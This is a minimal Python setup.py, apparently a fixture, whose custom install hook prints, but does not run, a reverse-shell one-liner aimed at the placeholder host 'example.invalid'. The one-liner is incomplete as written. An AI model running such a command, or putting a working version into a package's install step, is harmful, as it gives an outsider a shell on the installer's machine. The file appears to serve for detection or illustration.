from setuptools import setup
from setuptools.command.install import install

class Install(install):
    def run(self):
        example = 'python -c "import socket,os;s=socket.socket();s.connect((\'example.invalid\',1234));os.dup2(s.fileno(),0);subprocess.call([\'/bin/sh\'])"'
        print(example)
        install.run(self)

setup(name="example", cmdclass={"install": Install})
